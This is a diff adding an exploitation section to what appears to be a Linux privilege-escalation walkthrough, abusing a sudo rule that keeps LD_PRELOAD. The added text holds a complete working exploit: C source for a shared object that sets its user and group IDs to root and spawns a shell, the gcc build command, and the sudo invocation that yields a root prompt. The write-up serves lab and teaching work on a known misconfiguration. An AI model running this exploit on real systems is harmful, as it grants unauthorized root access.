@@ -72,3 +72,36 @@ pipe@whitecr0wz:/tmp$
 ```
 
 Take a glance at the flag ```env_keep+=LD_PRELOAD```, this means that we can set ```LD_PRELOAD```.
+
+##### Exploitation
+
+In order to exploit this vector, we require a binary that uses the value given in the ```LD_PRELOAD``` variable. A great example of such should be the following.
+
+```term
+pipe@whitecr0wz:/tmp$ cat rootshell.c 
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+pipe@whitecr0wz:/tmp$
+```
+
+This is compiled.
+
+```term
+pipe@whitecr0wz:/tmp$ gcc rootshell.c -o rootshell -fPIC -shared -nostartfiles -w 
+pipe@whitecr0wz:/tmp$
+```
+
+#### Profit
+
+```term
+pipe@whitecr0wz:/tmp$ sudo LD_PRELOAD=/tmp/rootshell ping 
+root@whitecr0wz:/tmp#
+```
